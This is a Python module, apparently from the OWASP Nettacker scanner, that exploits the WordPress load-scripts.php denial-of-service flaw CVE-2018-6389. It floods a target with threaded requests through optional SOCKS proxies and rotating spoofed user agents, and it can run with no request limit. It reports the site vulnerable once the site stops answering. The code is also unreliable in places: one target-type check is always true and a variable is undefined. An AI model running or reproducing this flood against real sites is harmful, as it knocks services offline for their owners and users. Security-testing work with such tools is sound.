#!/usr/bin/env python
# -*- coding: utf-8 -*-

# references
# https://www.youtube.com/watch?v=nNDsGTalXS0
# https://baraktawily.blogspot.nl/2018/02/how-to-dos-29-of-world-wide-websites.html
# https://github.com/zdresearch/OWASP-Nettacker/blob/master/lib/vuln/wordpress_dos_cve_2018_6389/engine.py

import socket
import socks
import time
import json
import threading
import string
import random
import requests
import random
import os
from core.alert import *
from core.targets import target_type
from core.targets import target_to_host
from core.load_modules import load_file_path
from lib.socks_resolver.engine import getaddrinfo
from core._time import now
from core.log import __log_into_file
from core._die import __die_failure


def extra_requirements_dict():
    return {

        "wordpress_dos_cve_2018_6389_vuln_random_agent": ["True"],
        "wordpress_dos_cve_2018_6389_vuln_no_limit": ["False"],
    }


def send_dos(target, user_agent, timeout_sec, log_in_file, language, time_sleep, thread_tmp_filename, retries,
             socks_proxy, scan_id, scan_cmd):
    time.sleep(time_sleep)
    payload = "/wp-admin/load-scripts.php?c=1&load%5B%5D=eutil,common,wp-a11y,sack" \
              ",quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api" \
              "-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype" \
              ",scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous" \
              "-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls," \
              "scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core," \
              "jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip" \
              ",jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold," \
              "jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale," \
              "jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer," \
              "jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker," \
              "jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse," \
              "jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable," \
              "jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs," \
              "jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query," \
              "jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest," \
              "imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers," \
              "wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore," \
              "backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement," \
              "mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror," \
              "csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor," \
              "wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest," \
              "admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader," \
              "customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh," \
              "customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus," \
              "wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo," \
              "mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link," \
              "comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget," \
              "media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post," \
              "inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision," \
              "media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery," \
              "svg-painter&ver=4.9.1"
    try:
        if socks_proxy is not None:
            socks_version = socks.SOCKS5 if socks_proxy.startswith(
                'socks5://') else socks.SOCKS4
            socks_proxy = socks_proxy.rsplit('://')[1]
            if '@' in socks_proxy:
                socks_username = socks_proxy.rsplit(':')[0]
                socks_password = socks_proxy.rsplit(':')[1].rsplit('@')[0]
                socks.set_default_proxy(socks_version, str(socks_proxy.rsplit('@')[1].rsplit(':')[0]),
                                        int(socks_proxy.rsplit(':')[-1]), username=socks_username,
                                        password=socks_password)
                socket.socket = socks.socksocket
                socket.getaddrinfo = getaddrinfo
            else:
                socks.set_default_proxy(socks_version, str(
                    socks_proxy.rsplit(':')[0]), int(socks_proxy.rsplit(':')[1]))
                socket.socket = socks.socksocket
                socket.getaddrinfo = getaddrinfo
        r = requests.get(target + payload, timeout=timeout_sec,
                         headers=user_agent).content
        return True
    except:
        return False


def test(target, retries, timeout_sec, user_agent, socks_proxy, verbose_level, trying, total_req, total,
         num, language, dos_flag, log_in_file, scan_id, scan_cmd, thread_tmp_filename):
    if verbose_level > 3:
        info(messages(language, "trying_message").format(trying, total_req, num, total, target_to_host(target), '',
                                                         'wordpress_dos_cve_2018_6389_vuln'))
    if socks_proxy is not None:
        socks_version = socks.SOCKS5 if socks_proxy.startswith(
            'socks5://') else socks.SOCKS4
        socks_proxy = socks_proxy.rsplit('://')[1]
        if '@' in socks_proxy:
            socks_username = socks_proxy.rsplit(':')[0]
            socks_password = socks_proxy.rsplit(':')[1].rsplit('@')[0]
            socks.set_default_proxy(socks_version, str(socks_proxy.rsplit('@')[1].rsplit(':')[0]),
                                    int(socks_proxy.rsplit(':')[-1]), username=socks_username,
                                    password=socks_password)
            socket.socket = socks.socksocket
            socket.getaddrinfo = getaddrinfo
        else:
            socks.set_default_proxy(socks_version, str(
                socks_proxy.rsplit(':')[0]), int(socks_proxy.rsplit(':')[1]))
            socket.socket = socks.socksocket
            socket.getaddrinfo = getaddrinfo
    n = 0
    while 1:
        try:
            r = requests.get(target, timeout=timeout_sec,
                             headers=user_agent).content
            return 0
        except:
            n += 1
            if n is retries:
                if dos_flag:
                    __log_into_file(thread_tmp_filename, 'w', '0', language)
                    info(messages(language, "vulnerable").format(
                        "wordpress_dos_cve_2018_6389_vuln"))
                    data = json.dumps({'HOST': target_to_host(target), 'USERNAME': '', 'PASSWORD': '', 'PORT': '',
                                       'TYPE': 'wordpress_dos_cve_2018_6389_vuln',
                                       'DESCRIPTION': messages(language, "vulnerable").format(
                                           "wordpress_dos_cve_2018_6389_vuln"), 'TIME': now(), 'CATEGORY': "scan",
                                       'SCAN_ID': scan_id, 'SCAN_CMD': scan_cmd})
                    __log_into_file(log_in_file, 'a', data, language)
                return 1


def start(target, users, passwds, ports, timeout_sec, thread_number, num, total, log_in_file, time_sleep, language,
          verbose_level, socks_proxy, retries, methods_args, scan_id, scan_cmd):  # Main function
    if target_type(target) != 'SINGLE_IPv4' or target_type(target) != 'DOMAIN' or target_type(
            target) != 'HTTP' or target_type(target) != 'SINGLE_IPv6':
        # rand useragent
        user_agent_list = [
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.5) Gecko/20060719 Firefox/1.5.0.5",
            "Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
            "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Ubuntu/10.04"
            " Chromium/9.0.595.0 Chrome/9.0.595.0 Safari/534.13",
            "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; WOW64; .NET CLR 2.0.50727)",
            "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
            "Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620",
            "Debian APT-HTTP/1.3 (0.8.10.3)",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
            "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
            "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; "
            "http://help.yahoo.com/help/us/shop/merchant/)",
            "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
            "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "msnbot/1.1 (+http://search.msn.com/msnbot.htm)"
        ]
        user_agent = {'User-agent': random.choice(user_agent_list)}
        limit = 1000
        # requirements check
        new_extra_requirements = extra_requirements_dict()
        if methods_args is not None:
            for extra_requirement in extra_requirements_dict():
                if extra_requirement in methods_args:
                    new_extra_requirements[
                        extra_requirement] = methods_args[extra_requirement]
        extra_requirements = new_extra_requirements
        random_agent_flag = True
        if extra_requirements["wordpress_dos_cve_2018_6389_vuln_random_agent"][0] != "True":
            random_agent_flag = False
        if extra_requirements["wordpress_dos_cve_2018_6389_vuln_no_limit"][0] != "False":
            limit = -1
        threads = []
        total_req = limit
        filepath = os.path.dirname(os.path.dirname(os.path.realpath(__file__)))
        thread_tmp_filename = '{}/tmp/thread_tmp_'.format(load_file_path()) + ''.join(
            random.choice(string.ascii_letters + string.digits) for _ in range(20))
        __log_into_file(thread_tmp_filename, 'w', '1', language)
        trying = 0
        if target_type(target) == 'SINGLE_IPv4' or target_type(target) == 'DOMAIN':
            url = 'http://{0}/'.format(target)
        else:
            if target.count(':') > 1:
                __die_failure(messages(language, "insert_port_message"))
            http = target.rsplit('://')[0]
            host = target_to_host(target)
            path = "/".join(target.replace('http://',
                                           '').replace('https://', '').rsplit('/')[1:])
            url = http + '://' + host + '/' + path
        if test(url, retries, timeout_sec, user_agent, socks_proxy, verbose_level, trying, total_req, total, num,
                language, False, log_in_file, scan_id, scan_cmd, thread_tmp_filename) is not 0:
            warn(messages(language, "open_error").format(url))
            return
        info(messages(language, "DOS_send").format(target))
        n = 0
        t = threading.Thread(target=test,
                             args=(
                                 url, retries, timeout_sec, user_agent, socks_proxy, verbose_level, trying, total_req,
                                 total, num, language, True, log_in_file, scan_id, scan_cmd, thread_tmp_filename))
        t.start()
        keyboard_interrupt_flag = False
        while (n != limit):
            n += 1
            if random_agent_flag:
                user_agent = {'User-agent': random.choice(user_agent_list)}
            t = threading.Thread(target=send_dos,
                                 args=(url, user_agent, timeout_sec, log_in_file, language, time_sleep,
                                       thread_tmp_filename, retries, socks_proxy, scan_id,
                                       scan_cmd))
            threads.append(t)
            t.start()
            trying += 1
            if verbose_level > 3:
                info(messages(language, "trying_message").format(trying, total_req, num, total, target_to_host(target), port,
                                                                 'wordpress_dos_cve_2018_6389_vuln'))
            try:
                if int(open(thread_tmp_filename).read().rsplit()[0]) is 0:
                    if limit is not -1:
                        break
            except Exception:
                pass
            while 1:
                try:
                    if threading.activeCount() >= thread_number:
                        time.sleep(0.01)
                    else:
                        break
                except KeyboardInterrupt:
                    keyboard_interrupt_flag = True
                    break
            if keyboard_interrupt_flag:
                break
        # wait for threads
        kill_switch = 0
        kill_time = int(
            timeout_sec / 0.1) if int(timeout_sec / 0.1) is not 0 else 1
        while 1:
            time.sleep(0.1)
            kill_switch += 1
            try:
                if threading.activeCount() is 2 or kill_switch is kill_time:
                    break
            except KeyboardInterrupt:
                break
        thread_write = int(open(thread_tmp_filename).read().rsplit()[0])
        if thread_write is 1:
            info(messages(language, "no_vulnerability_found").format(
                "wordpress_dos_cve_2018_6389_vuln"))
            if verbose_level is not 0:
                data = json.dumps({'HOST': target, 'USERNAME': '', 'PASSWORD': '', 'PORT': '',
                                   'TYPE': 'wordpress_dos_cve_2018_6389_vuln',
                                   'DESCRIPTION': messages(language, "no_vulnerability_found").format("wordpress_dos_cve_2018_6389_vuln"),
                                   'TIME': now(), 'CATEGORY': "scan",
                                   'SCAN_ID': scan_id, 'SCAN_CMD': scan_cmd})
                __log_into_file(log_in_file, 'a', data, language)
        os.remove(thread_tmp_filename)
    else:
        warn(messages(language, "input_target_error").format(
            'wordpress_dos_cve_2018_6389_vuln', target))
